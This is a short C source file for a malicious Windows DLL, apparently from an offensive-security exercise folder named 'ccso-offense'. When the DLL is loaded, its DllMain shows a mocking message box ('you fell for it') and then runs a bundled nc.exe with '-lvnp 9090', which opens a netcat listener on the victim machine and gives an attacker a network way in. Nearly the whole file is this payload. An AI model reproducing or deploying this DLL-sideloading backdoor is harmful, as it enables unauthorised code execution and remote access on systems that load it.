#include <windows.h>

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
            MessageBox(NULL, "I love balls in my face lol.. so sus lol i cant beluve you fell for it lmfao lol", "balls", MB_ICONERROR | MB_OK);
            int i;
            i = system ("C:\\Users\\joshm\\Desktop\\ccso-offense\\dll\\nc.exe -lvnp 9090");
            break;
    }
    return TRUE;
}